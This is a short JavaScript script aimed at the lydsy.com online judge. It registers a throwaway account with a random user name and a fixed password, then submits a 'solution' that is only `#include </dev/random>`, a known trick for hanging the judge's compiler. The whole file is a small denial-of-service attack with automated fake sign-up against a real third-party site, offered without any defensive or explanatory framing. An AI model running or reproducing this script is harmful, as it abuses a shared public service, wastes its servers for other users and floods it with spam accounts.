let uid = 'Test' + Math.random().toString().replace(/\D/img, '').substr(0, 20)
let password = 'Asswecan'
let code = `#include </dev/random>`
var register = function (callback) {
  fetch('https://www.lydsy.com/JudgeOnline/register.php', {
    method: 'POST',
    body: {
      user_id: uid,
      password: password,
      rptpassword: password
    }
  }).then(callback)
}
var submit = function () {
  fetch('http://www.lydsy.com/JudgeOnline/submit.php', {
    method: 'POST',
    body: {
      id: 1000,
      language: 1,
      source: code
    }
  }).then(() => alert('代码已提交'))
}
setTimeout(register, 0, submit)

